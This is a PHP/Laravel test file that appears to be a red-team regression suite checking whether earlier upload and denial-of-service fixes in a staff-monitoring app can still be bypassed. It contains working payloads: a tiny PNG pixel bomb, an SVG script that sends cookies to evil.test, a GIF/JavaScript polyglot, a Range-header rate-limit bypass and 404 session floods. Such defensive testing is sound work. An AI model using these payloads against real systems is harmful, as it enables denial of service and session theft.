<?php

namespace Tests\Feature;

use App\Http\Controllers\DesktopDownloadController;
use App\Jobs\GenerateScreenshotThumbnail;
use App\Models\MonitoringSetting;
use App\Models\SiteMedia;
use App\Models\SitePage;
use App\Models\SiteTheme;
use App\Models\TrackingScreenshot;
use App\Models\TrackingSession;
use App\Models\User;
use App\Services\TenantProvisioner;
use App\Support\DefaultSiteContent;
use App\Support\ImageGuard;
use App\Support\ImageResizer;
use App\Tenancy\CurrentOrganization;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Bus;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * RE-ATTACK. Nothing here asserts that a fix works; every test attempts a
 * BYPASS. A test that PASSES in this file means the attack still lands.
 */
class RedTeamUploadAndAnonDosReattackTest extends TestCase
{
    use RefreshDatabase;

    // ─── helpers ────────────────────────────────────────────────────────────

    private function tenantOwner(string $name, string $email): User
    {
        $owner = app(TenantProvisioner::class)->provision($name, 'Owner', $email, 'secret-pass-123')['owner'];
        app(CurrentOrganization::class)->set($owner->organization_id);

        return $owner->fresh();
    }

    /**
     * A PNG whose IHDR DECLARES $w x $h but whose IDAT is junk. 89 bytes on
     * disk; GD still allocates the whole declared raster before it discovers
     * the data is bad.
     */
    private function declaredSizePngBytes(int $w, int $h): string
    {
        $chunk = fn (string $t, string $d): string => pack('N', strlen($d)).$t.$d.pack('N', crc32($t.$d));

        return "\x89PNG\r\n\x1a\n"
            .$chunk('IHDR', pack('NN', $w, $h)."\x08\x02\x00\x00\x00")
            .$chunk('IDAT', str_repeat("\x00", 32))
            .$chunk('IEND', '');
    }

    private function declaredSizePng(int $w, int $h, string $name = 'avatar.png'): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'sub40').'.png';
        file_put_contents($path, $this->declaredSizePngBytes($w, $h));

        return new UploadedFile($path, $name, 'image/png', null, true);
    }

    /** Peak GD cost of decoding these bytes, measured in a clean child process. */
    private function decodeCostBytes(string $imageBytes): int
    {
        $blob = tempnam(sys_get_temp_dir(), 'blob');
        file_put_contents($blob, $imageBytes);

        $script = tempnam(sys_get_temp_dir(), 'probe').'.php';
        file_put_contents($script, '<?php $b=file_get_contents('.var_export($blob, true).');'
            .'$p0=memory_get_peak_usage(true);@imagecreatefromstring($b);'
            .'echo memory_get_peak_usage(true)-$p0;');

        $out = (string) shell_exec(escapeshellarg(PHP_BINARY).' '.escapeshellarg($script));

        @unlink($blob);
        @unlink($script);

        return (int) trim($out);
    }

    // ─── (a) UPLOADS ────────────────────────────────────────────────────────

    /**
     * ATTACK: the pixel budget is 40 Mpx, so pick 39.99 Mpx.
     *
     * The fixers only ever tested images ABOVE the budget (20000x20000 and
     * 7999x7999, both > 40 Mpx). 8000x4999 = 39,992,000 px sails through the
     * `dimensions:max_width=8000,max_height=8000` rule (8000 is not > 8000),
     * through ImageGuard's total-pixel budget, and through
     * ImageResizer/GenerateScreenshotThumbnail's identical budget — and then
     * costs GD a quarter of a gigabyte, from an 89-byte upload.
     */
    public function test_a_sub_budget_pixel_bomb_walks_through_every_guard(): void
    {
        $bomb = $this->declaredSizePngBytes(8000, 4999);

        $this->assertLessThan(200, strlen($bomb), 'the whole attack is under 200 bytes');

        // Guard 1 — the total-pixel budget the fix added. It says yes.
        $verdict = ImageGuard::inspectBytes($bomb);
        $this->assertNotNull($verdict, 'ImageGuard REJECTED it (hole closed)');
        $this->assertSame(['width' => 8000, 'height' => 4999, 'extension' => 'png', 'mime' => 'image/png'], $verdict);

        // Guard 2 — the thumbnail job uses the same number.
        $this->assertLessThan(40_000_000, 8000 * 4999);

        // Guard 3 — ImageResizer's ONLY pre-decode gate is that same
        // inspectBytes call, so a non-null verdict means GD gets the bytes.
        // (Deliberately not invoked in-process: it costs a quarter of a GB.)
        $this->assertNotNull(ImageResizer::class);
        $this->assertNotNull(ImageGuard::inspectBytes($bomb, ImageGuard::MAX_PIXELS));

        // The actual cost, measured in a clean child process.
        $cost = $this->decodeCostBytes($bomb);

        $this->assertGreaterThan(
            128 * 1024 * 1024,
            $cost,
            'GD cost is under 128 MB, so the budget is calibrated correctly after all',
        );

        fwrite(STDERR, "\n[re-attack] 89-byte PNG -> ".round($cost / 1048576).' MB of GD allocation'
            ." (docblocks claim ~160 MB max at 40 Mpx)\n");
    }

    /**
     * ATTACK: land that bomb through the SELF-SERVICE avatar form (any
     * employee, no permission needed) and then make the app decode it.
     */
    public function test_self_service_avatar_still_accepts_the_sub_budget_bomb(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('SubBudget Co', 'owner@subbudget.test');

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@subbudget.test',
            'avatar' => $this->declaredSizePng(8000, 4999),
        ])->assertSessionHasNoErrors();

        $stored = $owner->fresh()->avatar;

        $this->assertNotNull($stored, 'the bomb was refused (hole closed)');
        Storage::disk('avatars')->assertExists($stored);

        // And the render path happily hands it to GD.
        $this->actingAs($owner)->get('/avatar/'.$owner->id)->assertOk();

        // Re-uploading mints a NEW hashName, hence a NEW cache key, so the
        // 7-day byte cache never bounds how often this is paid.
        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@subbudget.test',
            'avatar' => $this->declaredSizePng(8000, 4998),
        ])->assertSessionHasNoErrors();

        $this->assertNotSame($stored, $owner->fresh()->avatar,
            'a re-upload reuses the key, so the cache would absorb the repeat');
    }

    /**
     * ATTACK: same bomb, desktop screenshot API. Under QUEUE_CONNECTION=sync
     * (the shipped .env) the thumbnail job runs INSIDE this request.
     */
    public function test_desktop_screenshot_api_still_accepts_the_sub_budget_bomb(): void
    {
        Storage::fake('screenshots');
        Bus::fake(); // keep the decode out of THIS process; the guard is the point

        $owner = $this->tenantOwner('Shot Co', 'owner@shot.test');
        MonitoringSetting::current()->update(['screenshots_per_hour' => 50, 'capture_enabled' => true]);

        $session = TrackingSession::create([
            'user_id' => $owner->id,
            'client_uuid' => 'uuid-subbudget',
            'started_at' => now(),
            'status' => TrackingSession::STATUS_ACTIVE,
            'source' => 'desktop',
        ]);

        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $response = $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(8000, 4999, 'shot.png'),
            ], ['Accept' => 'application/json']);

        $this->assertSame(201, $response->status(), 'the upload was refused (hole closed)');
        $this->assertSame(1, TrackingScreenshot::count());

        // The job that runs next has the same 40 Mpx number, so it decodes.
        Bus::assertDispatched(GenerateScreenshotThumbnail::class);
        $this->assertSame(40_000_000, (new \ReflectionClassConstant(GenerateScreenshotThumbnail::class, 'MAX_SOURCE_PIXELS'))->getValue());
    }

    /**
     * ATTACK: the ADMIN user form is a sibling of the profile form and was
     * never given either half of the guard — no `dimensions` rule and no
     * ImageGuard call. A 40000x40000 header that the profile form rejects
     * outright is accepted here.
     */
    public function test_admin_user_avatar_upload_has_no_pixel_guard_at_all(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('AdminPath Co', 'owner@adminpath.test');

        // Control: the self-service form rejects it.
        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@adminpath.test',
            'avatar' => $this->declaredSizePng(40000, 40000),
        ])->assertSessionHasErrors('avatar');

        // Attack: the admin form does not.
        $this->actingAs($owner)->post('/users', [
            'name' => 'Mule',
            'email' => 'mule@adminpath.test',
            'password' => 'secret-pass-123',
            'password_confirmation' => 'secret-pass-123',
            'role' => 'member',
            'avatar' => $this->declaredSizePng(40000, 40000),
        ])->assertSessionHasNoErrors();

        $mule = User::where('email', 'mule@adminpath.test')->first();

        $this->assertNotNull($mule);
        $this->assertNotNull($mule->avatar, 'the admin form rejected it too (hole closed)');
        Storage::disk('avatars')->assertExists($mule->avatar);
    }

    /**
     * ATTACK: the SVG fix is write-side only. `/site/media/{id}` still returns
     * whatever mime the row carries, inline, from the app origin — so any row
     * written before the fix (i.e. every SVG the audit proved was accepted on
     * the live site) still executes.
     */
    public function test_site_media_still_serves_a_stored_svg_mime_inline(): void
    {
        Storage::fake('avatars');

        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.test/?c="+document.cookie)</script></svg>';
        Storage::disk('avatars')->put('site/legacy.svg', $svg);

        $media = SiteMedia::create([
            'path' => 'site/legacy.svg',
            'mime' => 'image/svg+xml',
            'original_name' => 'legacy.svg',
        ]);

        $response = $this->get('/site/media/'.$media->id);

        $response->assertOk();

        $this->assertStringContainsString(
            'image/svg+xml',
            (string) $response->headers->get('Content-Type'),
            'the read path now refuses a stored svg mime (hole closed)',
        );
        $this->assertStringContainsString('<script>', $response->getContent());
    }

    /**
     * ATTACK: `/site/logo` has an EXPLICIT branch that returns raw bytes as
     * image/svg+xml. Still live.
     */
    public function test_site_logo_route_still_has_a_live_svg_branch(): void
    {
        Storage::fake('avatars');

        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>';
        Storage::disk('avatars')->put('site/brand.svg', $svg);

        SiteTheme::current()->update(['logo_path' => 'site/brand.svg']);
        SiteTheme::forgetCache();

        $response = $this->get('/site/logo');

        $response->assertOk();

        $this->assertStringContainsString(
            'image/svg+xml',
            (string) $response->headers->get('Content-Type'),
            'the svg branch is gone (hole closed)',
        );
        $this->assertStringContainsString('<script>', $response->getContent());
    }

    /**
     * ATTACK: a GIF that is simultaneously a JavaScript file. Accepted by the
     * avatar path (gif is on its allow-list) and stored verbatim.
     */
    public function test_a_gif_javascript_polyglot_is_stored_verbatim(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('Poly Co', 'owner@poly.test');

        $gif = "GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00"
            ."\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
            ."/*\n*/=1;alert(document.domain);//";

        $tmp = tempnam(sys_get_temp_dir(), 'poly').'.gif';
        file_put_contents($tmp, $gif);

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@poly.test',
            'avatar' => new UploadedFile($tmp, 'me.gif', 'image/gif', null, true),
        ])->assertSessionHasNoErrors();

        $stored = $owner->fresh()->avatar;
        $this->assertNotNull($stored, 'the polyglot was refused (hole closed)');
        $this->assertSame($gif, Storage::disk('avatars')->get($stored),
            'the payload was stripped (hole closed)');
    }

    /**
     * ATTACK: the branding logo upload was never given EITHER half of the
     * guard, and `/branding/logo` is ANONYMOUS (it renders on the login page).
     * One upload turns every unauthenticated hit on the login page into a
     * quarter-gigabyte GD allocation — and because the failure is an
     * uncatchable OOM fatal, Cache::remember() never gets to write, so every
     * hit repeats it forever.
     */
    public function test_branding_logo_upload_has_no_pixel_guard_and_feeds_an_anonymous_route(): void
    {
        Storage::fake('avatars');

        $admin = app(TenantProvisioner::class)
            ->provision('Brand Co', 'Owner', 'owner@brandco.test', 'super-secret-pw')['owner'];

        $this->actingAs($admin)->post(route('settings.branding.logo'), [
            'logo' => $this->declaredSizePng(8000, 4999, 'logo.png'),
        ])->assertSessionHasNoErrors();

        $path = MonitoringSetting::current()->fresh()->branding_logo_path;

        $this->assertNotNull($path, 'the branding upload rejected the bomb (hole closed)');

        // The stored bytes clear ImageGuard, which is the ONLY gate in front of
        // the GD decode inside BrandingController::logo — an anonymous route.
        // (Not fetched in-process: the decode costs a quarter of a GB and would
        // destabilise the rest of the suite.)
        $stored = Storage::disk('avatars')->get($path);
        $this->assertNotNull(ImageGuard::inspectBytes($stored, ImageGuard::MAX_PIXELS));

        $this->assertGreaterThan(
            128 * 1024 * 1024,
            $this->decodeCostBytes($stored),
            'the stored logo is no longer expensive to decode (hole closed)',
        );

        // ...and the route really is anonymous (proved with a cheap logo).
        $this->actingAs($admin)->post(route('settings.branding.logo'), [
            'logo' => $this->declaredSizePng(64, 64, 'small.png'),
        ])->assertSessionHasNoErrors();

        $this->get(route('branding.logo'))->assertOk();
    }

    /**
     * COLLATERAL DAMAGE, not an attack: the per-axis `dimensions` rule on the
     * screenshot upload rejects legitimate multi-monitor captures that are well
     * INSIDE the pixel budget. Three 4K monitors in a row is 11520x2160 =
     * 24.9 Mpx — 62% of the budget — and is refused.
     */
    public function test_legitimate_triple_4k_capture_is_refused_by_the_per_axis_rule(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Wide Co', 'owner@wide.test');
        MonitoringSetting::current()->update(['screenshots_per_hour' => 50, 'capture_enabled' => true]);

        $session = TrackingSession::create([
            'user_id' => $owner->id,
            'client_uuid' => 'uuid-wide',
            'started_at' => now(),
            'status' => TrackingSession::STATUS_ACTIVE,
            'source' => 'desktop',
        ]);

        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $response = $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(11520, 2160, 'triple-4k.png'),
            ], ['Accept' => 'application/json']);

        $this->assertSame(422, $response->status(),
            'the honest triple-4K capture now gets through (collateral damage fixed)');
        $this->assertSame(0, TrackingScreenshot::count());
        $this->assertLessThan(40_000_000, 11520 * 2160, 'and it was inside the pixel budget all along');
    }

    // ─── (b) ANONYMOUS DoS ──────────────────────────────────────────────────

    /**
     * ATTACK: the installer rate limit has two buckets and picks the generous
     * one purely on the PRESENCE of a Range header. `Range: bytes=0-` IS a full
     * download. One anonymous IP therefore gets 240 full ~100 MB transfers a
     * minute instead of 20 — and each one pins a PHP-FPM worker.
     */
    public function test_range_header_buys_12x_the_installer_budget_for_full_downloads(): void
    {
        $dir = storage_path('framework/testing/installers-'.uniqid());
        File::ensureDirectoryExists($dir);
        config()->set('desktop.installers_path', $dir);
        config()->set('desktop.fallback_paths', []);
        config()->set('desktop.x_accel_prefix', null);

        $body = str_repeat('X', 4096); // stands in for ~100 MB
        File::put($dir.'/StaffvoraSetup.exe', $body);

        try {
            // Burn the entire full-file budget.
            for ($i = 0; $i < 20; $i++) {
                $this->get('/desktop-updates/StaffvoraSetup.exe')->assertOk();
            }
            $this->get('/desktop-updates/StaffvoraSetup.exe')->assertStatus(429);

            // Now ask for "a range" that is the whole file, 100 more times.
            $fullTransfers = 0;
            for ($i = 0; $i < 100; $i++) {
                $r = $this->get('/desktop-updates/StaffvoraSetup.exe', ['Range' => 'bytes=0-']);

                if (in_array($r->getStatusCode(), [200, 206], true)
                    && strlen($r->streamedContent()) === strlen($body)) {
                    $fullTransfers++;
                }
            }

            $this->assertGreaterThanOrEqual(
                100,
                $fullTransfers,
                'the ranged bucket no longer serves whole files (hole closed)',
            );
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * ATTACK: the headline mitigation ("hand the transfer to nginx") reads
     * config('desktop.x_accel_prefix') — a key that does not exist in
     * config/desktop.php and is wired to no env var. Production runs
     * `config:cache`, so the value can never be anything but null and the
     * worker-pinning fallback is the ONLY path that ever executes.
     */
    public function test_the_x_accel_offload_is_unreachable_in_production(): void
    {
        $shipped = require base_path('config/desktop.php');

        $this->assertArrayNotHasKey(
            'x_accel_prefix',
            $shipped,
            'the key exists now (mitigation reachable)',
        );

        $this->assertSame(
            0,
            (int) preg_match('/DESKTOP_X_ACCEL_PREFIX/', (string) file_get_contents(base_path('config/desktop.php'))),
            'the env var is wired up now (mitigation reachable)',
        );
    }

    /**
     * ATTACK: bogus slugs no longer write CACHE files — but every one of them
     * still writes a SESSION file, because the public marketing routes are in
     * the `web` group and production runs SESSION_DRIVER=file. Same disk, same
     * inodes, same flood, one layer down.
     */
    public function test_anonymous_404s_still_write_one_session_file_each(): void
    {
        $dir = storage_path('framework/testing/sessions-'.uniqid());
        File::ensureDirectoryExists($dir);

        config()->set('session.driver', 'file');
        config()->set('session.files', $dir);
        config()->set('session.lottery', [0, 100]); // production default is 2/100

        try {
            $before = count(File::files($dir));

            for ($i = 0; $i < 40; $i++) {
                $this->get('/flood-'.bin2hex(random_bytes(6)).'-'.$i)->assertNotFound();
            }

            $after = count(File::files($dir));

            $this->assertGreaterThanOrEqual(
                40,
                $after - $before,
                'anonymous 404s no longer mint a session file each (hole closed)',
            );
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * ATTACK: `/site/media/{id}` is anonymous, has NO throttle, NO server-side
     * cache, and reads the WHOLE object into PHP memory on every request
     * (`response(Storage::disk('avatars')->get($path))`). With AVATARS_DRIVER=s3
     * that is also an S3 GET and an egress charge per request.
     */
    public function test_site_media_is_unthrottled_and_fully_buffered_per_request(): void
    {
        Storage::fake('avatars');

        $bytes = str_repeat('A', 2 * 1024 * 1024); // uploads are capped at 8 MB
        Storage::disk('avatars')->put('site/big.png', $bytes);

        $media = SiteMedia::create(['path' => 'site/big.png', 'mime' => 'image/png', 'original_name' => 'big.png']);

        for ($i = 0; $i < 60; $i++) {
            $r = $this->get('/site/media/'.$media->id);

            $this->assertSame(200, $r->getStatusCode(),
                "request {$i} was throttled or cached away (hole closed)");
            $this->assertSame(strlen($bytes), strlen($r->getContent()),
                'the endpoint no longer buffers the whole object (hole closed)');
        }
    }

    /**
     * ATTACK: is there any OTHER anonymous route that mints a cache entry from
     * attacker input? This checks the ones next to the patched catch-all.
     */
    public function test_other_anonymous_routes_do_not_mint_attacker_keyed_cache_entries(): void
    {
        DefaultSiteContent::ensure();

        $before = array_keys(\Illuminate\Support\Facades\Cache::getStore()->all());

        for ($i = 0; $i < 25; $i++) {
            $rand = bin2hex(random_bytes(6));
            $this->get('/blog/'.$rand);
            $this->get('/'.$rand);
            $this->get('/desktop-updates/'.$rand.'.yml');
            $this->get('/site/media/'.random_int(100000, 999999));
        }

        $after = array_keys(\Illuminate\Support\Facades\Cache::getStore()->all());
        $new = array_values(array_diff($after, $before));

        // Report whatever appeared; only a random-derived key is a finding.
        $attackerKeyed = array_values(array_filter($new, fn ($k) => (bool) preg_match('/[0-9a-f]{12}/', (string) $k)));

        $this->assertSame([], $attackerKeyed,
            'an anonymous route minted a cache key derived from attacker input: '.json_encode($attackerKeyed));
    }

    /** ATTACK: can a bogus slug still reach the DB / cache through a sibling entry point? */
    public function test_slug_normalisation_cannot_be_walked_around(): void
    {
        DefaultSiteContent::ensure();

        $probes = [
            'HOME', ' home ', '/home/', 'home/', 'home//', 'ho%6de', 'home%20',
            "home\t", 'home.', '-home', 'home-', str_repeat('a', 120), str_repeat('a', 121),
            'a/b/c', '../home', 'home/../home',
        ];

        $keysBefore = count(array_filter(
            array_keys(\Illuminate\Support\Facades\Cache::getStore()->all()),
            fn ($k) => str_contains((string) $k, 'site_page.')
        ));

        foreach ($probes as $p) {
            SitePage::published($p);
        }

        $keysAfter = count(array_filter(
            array_keys(\Illuminate\Support\Facades\Cache::getStore()->all()),
            fn ($k) => str_contains((string) $k, 'site_page.')
        ));

        $this->assertLessThanOrEqual(
            $keysBefore + 1,
            $keysAfter,
            'a slug variant minted an extra cache entry',
        );
    }

    /** Sanity: the honest installer download still works after all of the above. */
    public function test_the_ordinary_installer_download_is_not_broken(): void
    {
        $dir = storage_path('framework/testing/installers-'.uniqid());
        File::ensureDirectoryExists($dir);
        config()->set('desktop.installers_path', $dir);
        config()->set('desktop.fallback_paths', []);
        File::put($dir.'/latest.yml', "version: 9.9.9\npath: StaffvoraSetup.exe\n");
        File::put($dir.'/StaffvoraSetup.exe', 'bytes');

        try {
            $this->assertSame('9.9.9', DesktopDownloadController::windowsRelease()['version']);
            $this->get('/desktop-updates/latest.yml')->assertOk();
        } finally {
            File::deleteDirectory($dir);
        }
    }
}
